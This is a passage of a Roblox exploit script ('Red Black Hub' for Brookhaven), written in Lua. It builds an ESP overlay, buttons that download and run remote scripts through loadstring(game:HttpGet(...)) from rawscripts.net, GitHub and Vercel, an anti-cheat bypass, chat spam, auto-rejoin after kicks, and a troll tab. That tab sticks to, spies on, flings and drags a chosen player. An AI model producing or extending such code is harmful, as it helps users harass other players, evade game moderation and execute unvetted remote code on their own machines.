		h.OutlineColor = currentColor
		h.FillTransparency = 0.35
		h.Parent = model

		local bb = Instance.new("BillboardGui")
		bb.Size = UDim2.new(0,200,0,50)
		bb.AlwaysOnTop = true
		bb.Adornee = part
		bb.Parent = model

		local txt = Instance.new("TextLabel")
		txt.Size = UDim2.new(1,0,1,0)
		txt.BackgroundTransparency = 1
		txt.TextScaled = true
		txt.TextColor3 = Color3.new(1,1,1)
		txt.TextStrokeTransparency = 0
		txt.Parent = bb

		objects[model] = {H = h, B = bb, T = txt}
	end

	local function clear()
		for m,v in pairs(objects) do
			if v.H then v.H:Destroy() end
			if v.B then v.B:Destroy() end
		end
		table.clear(objects)
	end

	local function update()
		if not LocalPlayer.Character then return end
		local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		if not hrp then return end

		for m,v in pairs(objects) do
			if m and m.Parent then
				local part = m:FindFirstChildWhichIsA("BasePart")
				if part then
					local dist = (hrp.Position - part.Position).Magnitude
					local nick = m.Name:sub(5)
					v.T.Text = nick .. " | " .. math.floor(dist) .. "m"
				end
			end
		end
	end

	TabESP:AddDropdown({
		Name = "PROP ESP COLOR",
		Description = "Select active prop overlay tint",
		Options = {"RED","YELLOW","BLUE","GREEN","WHITE","BLACK","PURPLE","MAGENTA"},
		Default = "RED",
		Callback = function(v)
			local key = string.lower(v)
			if PROP_COLORS[key] then
				currentColor = PROP_COLORS[key]
				updateColor()
			end
		end
	})

	TabESP:AddToggle({
		Name = "PROP ESP",
		Default = false,
		Callback = function(state)
			enabled = state

			if state then
				for _,obj in pairs(workspace:GetDescendants()) do
					if valid(obj) then create(obj) end
				end

				addConn = workspace.DescendantAdded:Connect(function(obj)
					if enabled and valid(obj) then create(obj) end
				end)

				renderConn = RunService.RenderStepped:Connect(update)
			else
				if renderConn then renderConn:Disconnect() end
				if addConn then addConn:Disconnect() end
				clear()
			end
		end
	})
end


-- ==========================================
-- TAB SCRIPTS
-- ==========================================
local Tab1 = Window:MakeTab({"SCRIPTS", "code"})

Tab1:AddButton({"ESP GUI", function()
    loadstring(game:HttpGet('https://rawscripts.net/raw/Universal-Script-ESP-VERIFICADOR-DE-PLAYERS-V5-27937'))()
end})

Tab1:AddButton({"YAK HUB DO PEDRO OF WAR", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Yak-Scripts/yakhub/main/yakhub.lua", true))() 
end})

Tab1:AddButton({"SANDER X", function()
    loadstring(game:HttpGet('https://rawscripts.net/raw/Brookhaven-RP-Sander-X-Hub-Latest-Version-3-16718'))()
end})

Tab1:AddButton({"RED BLACK GUI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/CALCULADORA-RED-BLACK-/refs/heads/main/README.md"))()
end})

Tab1:AddButton({"R4D SEM KEY", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-R4D-script-no-key-17562"))()
end})

Tab1:AddButton({"INFINITE YIELD", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Infinite-Yield_500"))()
end})

Tab1:AddButton({"TROLL GUI", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Troll-Gui-3874"))()
end})

Tab1:AddButton({"TELEPORT TOOL", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Teleport-Tool-27419"))()
end})

Tab1:AddButton({"TELEKINESIS", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-Telekinesis-V5-21542"))()
end})

Tab1:AddButton({"RED BLACK HUB BY RYAN", function()
    loadstring(game:HttpGet('https://redblackhub-protected.vercel.app/script'))()
end})

Tab1:AddButton({"RED BLACK HUB BY VOLTZ", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ygagga/Red-Black-hub-1.0-/refs/heads/main/673b292c795c6275.txt"))()
end})

end

--=================================
-- FUNÇÃO NORMAL
--=================================

local function RunNormalHub()

	warn("NORMAL HUB STARTED")

	-- >>> AQUI O RED BLACK HUB NORMAL <<<

-- =========================================================
-- Função de envio de mensagem no chat
-- =========================================================
local function SendExecuteMessage(msg)
    local Players = game:GetService("Players")
    local TextChatService = game:GetService("TextChatService")
    
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then  
        local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")  
        if channel then  
            pcall(function()  
                channel:SendAsync(msg)  
            end)  
        end  
    else  
        pcall(function()  
            game:GetService("ReplicatedStorage")  
                .DefaultChatSystemChatEvents  
                .SayMessageRequest:FireServer(msg, "All")  
        end)  
    end
end

-- Mensagem inicial
SendExecuteMessage("Red Black hub executed successfully!")

-- Serviços
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local RunService = game:GetService("RunService")

local lp = Players.LocalPlayer
local pg = lp:WaitForChild("PlayerGui")

-- Sequência de mensagens com delay
task.spawn(function()
    task.wait(1)
    SendExecuteMessage("Thanks for using the Red Black hub Brookhaven.")
    task.wait(1)  
    SendExecuteMessage("You are using the Luxurious version of the Red Black hub.")
end)

--========================================
-- RED BLACK HUB - LOADER CENTRALIZADO MAIOR
--========================================

-- CONFIG
local LOAD_TIME = 6
local HUB_TEXT = "RED BLACK HUB"
local LOGO_ID = "rbxassetid://91667192204008"
local LOADING_TEXTS = {"Loading...", "Loading Functions modules...", "Adding Labels..."}

-- LIMPA LOADER ANTIGO
for _, g in ipairs(pg:GetChildren()) do
    if g:IsA("ScreenGui") and g.Name:lower():find("rbh") then
        g:Destroy()
    end
end

-- BLUR
local blur = Instance.new("BlurEffect", Lighting)
blur.Size = 0
TweenService:Create(blur, TweenInfo.new(0.4), {Size = 18}):Play()

-- GUI PRINCIPAL
local gui = Instance.new("ScreenGui", pg)
gui.Name = "RBH_LOADER"
gui.DisplayOrder = 9999
gui.ResetOnSpawn = false

-- FRAME PRINCIPAL
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 700, 0, 400)
frame.Position = UDim2.new(0.5, 0, 1.2, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(10,10,10)
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0,28)

-- BORDA RGB
local stroke = Instance.new("UIStroke", frame)
stroke.Thickness = 3
task.spawn(function()
    while frame.Parent do
        stroke.Color = Color3.fromHSV((tick()*0.2)%1,1,1)
        RunService.RenderStepped:Wait()
    end
end)

-- ANIMAÇÃO DE ENTRADA
TweenService:Create(frame, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
    Position = UDim2.new(0.5, 0, 0.45, 0)
}):Play()

-- FUNDO HACKER
local hackerLines = {}
for i = 1, 45 do
    local txt = Instance.new("TextLabel", frame)
    txt.Size = UDim2.new(0,18,1,0)
    txt.Position = UDim2.new(0, math.random(0,680), 0, -400)
    txt.BackgroundTransparency = 1
    txt.Text = string.rep("01\n", math.random(25,45))
    txt.TextColor3 = Color3.fromRGB(255, 0, 0)
    txt.Font = Enum.Font.Code
    txt.TextSize = 14
    txt.ZIndex = 1

    table.insert(hackerLines, txt)  

    task.spawn(function()  
        while txt.Parent do  
            TweenService:Create(  
                txt,  
                TweenInfo.new(math.random(4,7), Enum.EasingStyle.Linear),  
                {Position = UDim2.new(0, txt.Position.X.Offset, 0, 400)}  
            ):Play()  
            task.wait(math.random(1,2))  
        end  
    end)
end

-- LOGO CENTRAL
local logo = Instance.new("ImageLabel", frame)
logo.Size = UDim2.new(0,120,0,120)
logo.Position = UDim2.new(0.5,0,0,30)
logo.AnchorPoint = Vector2.new(0.5,0)
logo.BackgroundTransparency = 1
logo.Image = LOGO_ID
logo.ZIndex = 5

-- TEXTO HUB
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1,0,0,40)
title.Position = UDim2.new(0,0,0,160)
title.BackgroundTransparency = 1
title.Text = HUB_TEXT
title.Font = Enum.Font.GothamBold
title.TextSize = 32
title.TextColor3 = Color3.new(1,1,1)
title.ZIndex = 5

-- TEXTO DE LOADING
local loadingLabel = Instance.new("TextLabel", frame)
loadingLabel.Size = UDim2.new(1,0,0,25)
loadingLabel.Position = UDim2.new(0,0,0,210)
loadingLabel.BackgroundTransparency = 1
loadingLabel.Font = Enum.Font.Gotham
loadingLabel.TextSize = 20
loadingLabel.TextColor3 = Color3.new(1,1,1)
loadingLabel.ZIndex = 5
loadingLabel.Text = LOADING_TEXTS[1]

-- BLOCOS GIRANDO NOS CANTOS
local function createRotatingBlock(pos)
    local block = Instance.new("Frame", frame)
    block.Size = UDim2.new(0,50,0,50)
    block.Position = pos
    block.AnchorPoint = Vector2.new(0.5,0.5)
    block.BackgroundColor3 = Color3.fromRGB(255,0,0)
    Instance.new("UICorner", block).CornerRadius = UDim.new(0,8)
    task.spawn(function()
        while block.Parent do
            TweenService:Create(block, TweenInfo.new(0.6), {
                Rotation = block.Rotation + 180,
                BackgroundColor3 = Color3.fromHSV(math.random(),1,1)
            }):Play()
            task.wait(0.6)
        end
    end)
    return block
end

createRotatingBlock(UDim2.new(0,50,0,50))
createRotatingBlock(UDim2.new(1,-50,0,50))

-- BARRA DE LOADER EM BLOCOS
local loaderContainer = Instance.new("Frame", frame)
loaderContainer.Size = UDim2.new(0, 600, 0, 35)
loaderContainer.Position = UDim2.new(0.5,0,0.85,0)
loaderContainer.AnchorPoint = Vector2.new(0.5,0.5)
loaderContainer.BackgroundColor3 = Color3.fromRGB(50,50,50)
loaderContainer.BorderSizePixel = 0
Instance.new("UICorner", loaderContainer).CornerRadius = UDim.new(0,10)

local numBlocks = 30
local blocks = {}
for i = 1, numBlocks do
    local b = Instance.new("Frame", loaderContainer)
    b.Size = UDim2.new(1/numBlocks, -2, 1, -2)
    b.Position = UDim2.new((i-1)/numBlocks, 1, 0, 1)
    b.BackgroundColor3 = Color3.fromRGB(255,0,0)
    b.BorderSizePixel = 0
    b.BackgroundTransparency = 1
    Instance.new("UICorner", b).CornerRadius = UDim.new(0,4)
    table.insert(blocks, b)
end

-- SOM DE ENTRADA
local s = Instance.new("Sound", SoundService)
s.SoundId = "rbxassetid://9118828569"
s.Volume = 0.6
s:Play()

-- ANIMAÇÃO DO LOADER
for i = 1, numBlocks do
    blocks[i].BackgroundTransparency = 0
    if i % 5 == 0 then
        loadingLabel.Text = LOADING_TEXTS[((i/5-1) % #LOADING_TEXTS)+1]
    end
    task.wait(LOAD_TIME/numBlocks)
end

-- FINALIZAÇÃO
for _, txt in ipairs(hackerLines) do
    TweenService:Create(txt, TweenInfo.new(1.5), {TextTransparency = 1}):Play()
end

TweenService:Create(frame, TweenInfo.new(1.8, Enum.EasingStyle.Quad), {Size = UDim2.new(0,0,0,0)}):Play()
TweenService:Create(blur, TweenInfo.new(1.8), {Size = 0}):Play()
task.wait(1.9)
gui:Destroy()
blur:Destroy()

print("RED BLACK HUB LOADER FINISHED")

-- =========================================================
-- BAN / VERIFICAÇÃO
-- =========================================================
local banidos = {
    ["NHHSIHHSGHHSAHHS"] = true,
}

local bannedStrings = {
    "itz",  
    "ax7",
}

local function isExactNameBanned(player)
    return banidos[player.Name] == true
end

local function isNameContainingBannedWord(player)
    local name = string.lower(player.Name)  
    local display = string.lower(player.DisplayName)  
    for _, word in ipairs(bannedStrings) do  
        if string.find(name, word) or string.find(display, word) then  
            return true  
        end  
    end  
    return false
end

local function verificarBan(player)
    local ok, res = pcall(function()  
        if isExactNameBanned(player) or isNameContainingBannedWord(player) then  
            player:Kick("Proibido no Red Black Hub.")  
            return true  
        end  
        return false  
    end)  
    if not ok then  
        warn("Erro verificando ban:", res)  
        return false  
    end  
    return res
end

local LocalPlayer = Players.LocalPlayer
if LocalPlayer then
    verificarBan(LocalPlayer)
end

-- =========================================================
-- RP NAME + BIO (BROOKHAVEN FIX)
-- =========================================================
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RE = ReplicatedStorage:WaitForChild("RE")
local RPRemote = RE:WaitForChild("1RPNam1eTex1t")
local ColorRemote = RE:WaitForChild("1RPNam1eColo1r")

-- RP NAME
RPRemote:FireServer("RolePlayName", "{RED BLACK HUB | BROOKHAVEN}")

-- RP NAME COLOR (RED)
ColorRemote:FireServer("PickingRPNameColor", Color3.fromRGB(255, 0, 0))

-- RP BIO TEXT
local bioText
if lp.Name:lower() == "scarys_cary66666" then
    bioText = "OWNER OF RED BLACK HUB"
else
    bioText = "Hello " .. lp.DisplayName
end

RPRemote:FireServer("RolePlayBio", bioText)

-- RP BIO COLOR (BLACK)
ColorRemote:FireServer("PickingRPBioColor", Color3.fromRGB(0, 0, 0))

-- =========================================================
-- AUDIO LOGIC (SISTEMA DE SEQUÊNCIA DE AUDIO)
-- =========================================================
local sons = {
    "rbxassetid://94509403808673",  
    "rbxassetid://130219836212781",  
    "rbxassetid://78430692054916",  
    "rbxassetid://154345248",  
    "rbxassetid://87484814057059",  
    "rbxassetid://113491014204126",  
    "rbxassetid://110983956928751",  
    "rbxassetid://80344181334677",  
    "rbxassetid://97529429187942",  
    "rbxassetid://5858548244",  
    "rbxassetid://15929797051",  
    "rbxassetid://113118633294800",  
    "rbxassetid://113028772835303",  
    "rbxassetid://102566984907215",  
    "rbxassetid://100835951102315",  
    "rbxassetid://4810729995",  
    "rbxassetid://78430692054916"
}

_G.somIndex = _G.somIndex or 0

local function PlayNextSound()
    _G.somIndex = _G.somIndex + 1
    if _G.somIndex > #sons then
        _G.somIndex = 1
    end
    
    local tiro = Instance.new("Sound")
    tiro.SoundId = sons[_G.somIndex]
    tiro.Volume = 1
    tiro.Parent = SoundService
    tiro:Play()
    
    task.delay(5, function()
        tiro:Destroy()
    end)
end

-- =========================================================
-- SPLASH SEQUENCIAL COM FADE E DESFOQUE
-- =========================================================
local CoreGui = game:GetService("CoreGui")  
local ContentProvider = game:GetService("ContentProvider")  

local function runSplashSequence()  
    local totalTime = 4
    local half = totalTime / 2  

    local old = CoreGui:FindFirstChild("RBH_Splash")  
    if old then old:Destroy() end  

    -- Ativa desfoque no Lighting durante os Splashes
    local splashBlur = Instance.new("BlurEffect", Lighting)
    splashBlur.Size = 20

    local guiSplash = Instance.new("ScreenGui")  
    guiSplash.Name = "RBH_Splash"  
    guiSplash.IgnoreGuiInset = true  
    guiSplash.ResetOnSpawn = false  
    guiSplash.ZIndexBehavior = Enum.ZIndexBehavior.Sibling  
    guiSplash.Parent = CoreGui  

    local img = Instance.new("ImageLabel")  
    img.Name = "Splash"  
    img.BackgroundTransparency = 1  
    img.AnchorPoint = Vector2.new(0.5, 0.5)  
    img.Position = UDim2.fromScale(0.5, 0.5)  
    img.Size = UDim2.fromScale(0.35, 0.35)  
    img.ImageTransparency = 1  
    img.Parent = guiSplash  

    local corner = Instance.new("UICorner")  
    corner.CornerRadius = UDim.new(0, 16)  
    corner.Parent = img  

    -- TAbela com a ordem das imagens que vão rodar sequencialmente
    local imageSequence = {
        "116836698110493",
        "91667192204008"
    }

    -- Roda uma imagem de cada vez
    for _, assetId in ipairs(imageSequence) do
        img.Image = "rbxassetid://" .. tostring(assetId)
        
        pcall(function()  
            ContentProvider:PreloadAsync({ img.Image })  
        end)  

        -- Toca o som respectivo da iteração atual
        PlayNextSound()

        local fadeIn = TweenService:Create(  
            img,  
            TweenInfo.new(half, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),  
            { ImageTransparency = 0 }  
        )  
        local fadeOut = TweenService:Create(  
            img,  
            TweenInfo.new(half, Enum.EasingStyle.Quad, Enum.EasingDirection.In),  
            { ImageTransparency = 1 }  
        )  

        fadeIn:Play()
        fadeIn.Completed:Wait()  
        
        task.wait(0.2) -- Pequena pausa estável com a imagem visível antes de sumir
        
        fadeOut:Play()
        fadeOut.Completed:Wait()  
        
        task.wait(0.1) -- Intervalo rápido entre uma troca de imagem e outra
    end

    -- Limpa toda a estrutura e desliga o desfoque gradualmente
    guiSplash:Destroy()  
    TweenService:Create(splashBlur, TweenInfo.new(0.4), {Size = 0}):Play()
    task.delay(0.4, function() splashBlur:Destroy() end)
end  

-- Executa toda a sequência de splash travando o script aqui até terminar
runSplashSequence()

-- =========================================================
-- EXECUÇÃO DO HUB (SÓ COMEÇA APÓS TERMINAR OS SPLASHES)
-- =========================================================
local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/LibraryRobloc/refs/heads/main/RedzLibrary.lua"))()

local Window = redzlib:MakeWindow({
  Title = "RED BLACK HUB-BROOKHAVEN",
  SubTitle = "HUB VERSION:3.066:BASIC",
  SaveFolder = "RedBlackHub_Brookhaven.json"
})

Window:AddMinimizeButton({
    Button = {
        Image = "rbxassetid://116836698110493",
        BackgroundTransparency = 1,
        Size = UDim2.new(0, 70, 0, 70) -- tamanho maior
    },

    Corner = {
        CornerRadius = UDim.new(30000, 10000)
    }
})

-- ==========================================
-- TAB INFO
-- ==========================================
local TabInfo = Window:MakeTab({"TAB INFO", "info"})

TabInfo:AddDiscordInvite({
    Name = "RED BLACK COMMUNITY",
    Description = "Join our official Discord server!",
    Logo = "rbxassetid://91667192204008",
    Invite = "https://discord.gg/9yYA4gHrPJ",
})

TabInfo:AddButton({"COPY YOUTUBE", function()
    setclipboard("https://m.youtube.com/@THE_MR_RED_BLACK_SCRIPTS_OWNER")
end})

TabInfo:AddButton({"COPY TIKTOK", function()
    setclipboard("https://www.tiktok.com/@the_mr_red_black_owner?_r=1&_t=ZS-92VA3VA1kST")
end})

TabInfo:AddParagraph({""})

TabInfo:AddParagraph({"IDEAS:", "The Mr Red Black Scripts Owner\nKALEBAO\nThe Mr Dog\nBolota\nSlow\nAbacate\nGabriel\nrinkzada\nStreex\nThe Clock Work Dev\nStell Win\nEggman"})

TabInfo:AddParagraph({"HUB TESTERS:", "The Mr Red Black Scripts Owner\nKALEBAO\nThe Mr Dog\nKystrypkry\nBolota\nLeopys\nSlow\nCarlinhos Cavalos\nBlack\nmimiwhat\nSkynZ\nStarFarer\nShadow\nRyan\nRed Black\nStreex\nThe Clock Work Dev\nStell Win\nEggman"})

TabInfo:AddParagraph({"WARNING", "If you get banned using the Red Black hub, send a screenshot to the Red Black Community.\nWe are 30% responsible for your ban.\nIn other words, we're going to try to unban you from the game."})

TabInfo:AddParagraph({"HELP US", "Also, if you're a developer too, feel free to help me with the scripts if you'd like."})

-- ==========================================
-- TAB MAIN
-- ==========================================
local Tab5 = Window:MakeTab({"MAIN", "home"})

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local GuiService = game:GetService("GuiService")
local LocalPlayer = Players.LocalPlayer
local LP = Players.LocalPlayer

-- AUTO REJOIN ON KICK
local AutoRejoinEnabled = false
local KickConnection

Tab5:AddToggle({
    Name = "AUTO REJOIN ON KICK",
    Default = false,
    Callback = function(state)
        AutoRejoinEnabled = state

        if KickConnection then
            KickConnection:Disconnect()
            KickConnection = nil
        end

        if state then
            KickConnection = GuiService.ErrorMessageChanged:Connect(function(msg)
                if AutoRejoinEnabled and msg and msg ~= "" then
                    task.wait(1)
                    TeleportService:TeleportToPlaceInstance(
                        game.PlaceId,
                        game.JobId,
                        LocalPlayer
                    )
                end
            end)
        end
    end
})

-- COPY SERVER ID
Tab5:AddButton({"COPY SERVER ID", function()
    if setclipboard then
        setclipboard(game.JobId)
    end
end})

-- ANTI CHEAT BYPASS
Tab5:AddButton({"ANTI CHEAT BYPASS", function()
    for _,obj in ipairs(game:GetDescendants()) do
        if obj.Name then
            local n = string.lower(obj.Name)
            if n == "anticheat" or n == "exploit" then
                pcall(function()
                    obj:Destroy()
                end)
            end
        end
    end
end})

-- REJOIN
Tab5:AddButton({"REJOIN", function()
    game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
end})

-- JOIN/EXIT NOTIFICATION
local monitorConnections = {}

local function GetPlayerThumbnail(userId)
    local thumbType = Enum.ThumbnailType.HeadShot
    local thumbSize = Enum.ThumbnailSize.Size100x100
    local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
    return content
end

local function Notify(playerName, joined)
    local text = joined and ("PLAYER %s JOINED"):format(playerName) or ("PLAYER %s LEFT"):format(playerName)
    local player = Players:FindFirstChild(playerName)
    local icon = nil
    if player then
        icon = GetPlayerThumbnail(player.UserId)
    end
    game.StarterGui:SetCore("SendNotification", {
        Title = "RED BLACK HUB",
        Text = text,
        Icon = icon or "",
        Duration = 5
    })
end

Tab5:AddToggle({
    Name = "JOIN/EXIT NOTIFICATION",
    Default = false,
    Callback = function(state)
        for _, conn in pairs(monitorConnections) do
            conn:Disconnect()
        end
        monitorConnections = {}

        if state then
            table.insert(monitorConnections, Players.PlayerAdded:Connect(function(p)
                Notify(p.Name, true)
            end))

            table.insert(monitorConnections, Players.PlayerRemoving:Connect(function(p)
                Notify(p.Name, false)
            end))
        end
    end
})

-- COPY COORDINATES
Tab5:AddButton({"COPY COORDINATES", function()
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local pos = player.Character.HumanoidRootPart.Position
        setclipboard(string.format("X: %d, Y: %d, Z: %d", pos.X, pos.Y, pos.Z))
        print("Coordenadas copiadas para a area de transferencia: ", pos)
    else
        print("Nao foi possivel obter as coordenadas.")
    end
end})

-- GOTO SAFE ZONE
Tab5:AddButton({"GOTO SAFE ZONE", function()
    local char = LP.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    hrp.CFrame = CFrame.new(1080, 76, -1070)
end})

-- SET SPAWNPOINT
local spawnCFrame = nil

Tab5:AddButton({"SET SPAWNPOINT", function()
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        spawnCFrame = player.Character.HumanoidRootPart.CFrame
        print("Ponto de spawn definido!")
        
        game.StarterGui:SetCore("SendNotification", {
            Title = "SpawnPoint",
            Text = "Seu ponto de spawn foi salvo!",
            Duration = 5
        })
    else
        print("Nao foi possivel definir o ponto de spawn.")
    end
end})

game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
    if spawnCFrame then
        local hrp = char:WaitForChild("HumanoidRootPart", 10)
        if hrp then
            hrp.CFrame = spawnCFrame
            print("Teleportado para o ponto de spawn salvo!")
        end
    end
end)

-- ANTI AFK
local function antiAFK()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    
    local function moverJogador()
        humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.new(0, 0, 0.1)
        task.wait(1)
        humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.new(0, 0, -0.1)
    end

    while true do
        task.wait(600)
        moverJogador()
    end
end

Tab5:AddButton({"ANTI AFK", function()
    task.spawn(antiAFK)
end})

-- Seleciona a primeira aba ao carregar o script
Window:SelectTab(TabInfo)

-- ==========================================
-- TAB TROLL
-- ==========================================
do
    local TabTroll = Window:MakeTab({"TROLL", "skull"})

    local Players = game:GetService("Players")
    local LP = Players.LocalPlayer
    local RunService = game:GetService("RunService")
    local Camera = workspace.CurrentCamera
    local ReplicatedStorage = game:GetService("ReplicatedStorage")

    local selectedPlayerName = ""
    local selectedFlingType = "FLING"
    local orbitRadius = 6
    local orbitSpeed = 0.05
    local DISTANCE = 2

    local activeConnections = {}

    local function FindTarget(name)
        if not name or name == "" then return nil end
        name = name:lower()
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP and (plr.Name:lower():find(name) or plr.DisplayName:lower():find(name)) then
                return plr
            end
        end
        return nil
    end

    local function GetDynamicOffset(thrp)
        local isMoving = thrp.AssemblyLinearVelocity.Magnitude > 2
        return isMoving and 20 or 3
    end

    local function ClearConnection(key)
        if activeConnections[key] then
            if type(activeConnections[key]) == "thread" then
                task.cancel(activeConnections[key])
            elseif typeof(activeConnections[key]) == "RBXScriptConnection" then
                activeConnections[key]:Disconnect()
            end
            activeConnections[key] = nil
        end
        if LP.Character then
            local hrp = LP.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.AssemblyAngularVelocity = Vector3.zero
            end
        end
    end

    local function SpawnAndSitBoat()
        local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return nil end

        hrp.CFrame = CFrame.new(1620, -3, -318)
        task.wait(0.2)

        local re = ReplicatedStorage:FindFirstChild("RE")
        if re and re:FindFirstChild("1Ca1r") then
            local args = {
                [1] = "PickingBoat",
                [2] = "PirateFree",
                [3] = "Boat"
            }
            re["1Ca1r"]:FireServer(unpack(args))
        end

        task.wait(0.4)
        hrp.CFrame = CFrame.new(1647, 16, -327)
        task.wait(0.3)

        return workspace:FindFirstChild(LP.Name .. "Car")
    end

    TabTroll:AddTextBox({
        Name = "PLAYER NAME",
        Description = "Enter target player name",
        PlaceholderText = "Username or Display...",
        Callback = function(text)
            selectedPlayerName = text
        end
    })

    TabTroll:AddButton({"GET COUCH", function()
        local RS = ReplicatedStorage
        if RS:FindFirstChild("RE") and RS.RE:FindFirstChild("1Too1l") then
            RS.RE["1Too1l"]:InvokeServer("PickingTools", "Couch")
            task.wait(0.2)

            local backpack = LP:FindFirstChild("Backpack")
            local character = LP.Character
            if backpack and character then
                local couch = backpack:FindFirstChild("Couch")
                if couch then
                    character:FindFirstChildOfClass("Humanoid"):EquipTool(couch)
                end
            end
        end
    end})

    TabTroll:AddSection({"Basic Functions"})

    TabTroll:AddButton({"GO TO PLAYER", function()
        local target = FindTarget(selectedPlayerName)
        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
            LP.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, DISTANCE)
        end
    end})

    TabTroll:AddToggle({
        Name = "STICK PLAYER",
        Default = false,
        Callback = function(state)
            ClearConnection("STICK PLAYER")
            if state then
                activeConnections["STICK PLAYER"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                        LP.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, DISTANCE)
                    end
                end)
            end
        end
    })

    TabTroll:AddToggle({
        Name = "VIEW",
        Default = false,
        Callback = function(state)
            ClearConnection("VIEW")
            if state then
                activeConnections["VIEW"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if target and target.Character then
                        Camera.CameraSubject = target.Character:FindFirstChildOfClass("Humanoid")
                    end
                end)
            else
                if LP.Character then
                    Camera.CameraSubject = LP.Character:FindFirstChildOfClass("Humanoid")
                end
            end
        end
    })

    TabTroll:AddToggle({
        Name = "ORBITING PLAYER",
        Default = false,
        Callback = function(state)
            ClearConnection("ORBITING")
            if state then
                local angle = 0
                activeConnections["ORBITING"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                        angle = angle + orbitSpeed
                        local x, z = math.cos(angle) * orbitRadius, math.sin(angle) * orbitRadius
                        LP.Character.HumanoidRootPart.CFrame = CFrame.new(target.Character.HumanoidRootPart.Position + Vector3.new(x, 2, z), target.Character.HumanoidRootPart.Position)
                    end
                end)
            end
        end
    })

    TabTroll:AddDropdown({
        Name = "FLING METHOD",
        Description = "Select Fling Velocity Mode",
        Options = {"FLING", "TELEPORT+FLING"},
        Default = "FLING",
        Callback = function(val)
            selectedFlingType = val
        end
    })

    TabTroll:AddSection({"Heavy Trolls"})

    TabTroll:AddToggle({
        Name = "FLING COUCH",
        Default = false,
        Callback = function(state)
            ClearConnection("FLING COUCH")
            if state then
                local rotX, rotY, rotZ = 0, 0, 0

                activeConnections["FLING COUCH"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end

                    local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
                    local thrp = target.Character.HumanoidRootPart
                    local hum = target.Character:FindFirstChildOfClass("Humanoid")

                    if not hrp then return end

                    if hum and hum.Sit then
                        if selectedFlingType == "FLING" then
                            hrp.AssemblyLinearVelocity = Vector3.new(0, 999999999, 0)
                            hrp.CFrame = CFrame.new(0, 999999, 0)
                        else
                            hrp.CFrame = CFrame.new(0, 1e18, 0)
                        end
                        ClearConnection("FLING COUCH")
                        return
                    end

                    hrp.AssemblyLinearVelocity = Vector3.new(40000, 40000, 40000)
                    hrp.AssemblyAngularVelocity = Vector3.new(40000, 40000, 40000)

                    rotX = rotX + 90
                    rotY = rotY + 120
                    rotZ = rotZ + 90

                    hrp.CFrame = thrp.CFrame * CFrame.Angles(math.rad(rotX), math.rad(rotY), math.rad(rotZ))
                end)
            end
        end
    })

    TabTroll:AddToggle({
        Name = "BRING PLAYER",
        Default = false,
        Callback = function(state)
            ClearConnection("BRING PLAYER")
            if state then
                local angle1, angle2 = 0, 0
                local lastPos = LP.Character and LP.Character.HumanoidRootPart.CFrame
                activeConnections["BRING PLAYER"] = RunService.Heartbeat:Connect(function()
                    local target = FindTarget(selectedPlayerName)
                    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end

                    local hrp = LP.Character.HumanoidRootPart
                    local thrp = target.Character.HumanoidRootPart
                    local hum = target.Character:FindFirstChildOfClass("Humanoid")

                    if hum and hum.Sit then
                        if lastPos then hrp.CFrame = lastPos end
                        ClearConnection("BRING PLAYER")
                        return
                    end

                    local dist = GetDynamicOffset(thrp)

                    angle1 = angle1 + 1.2
                    angle2 = angle2 + 1.8
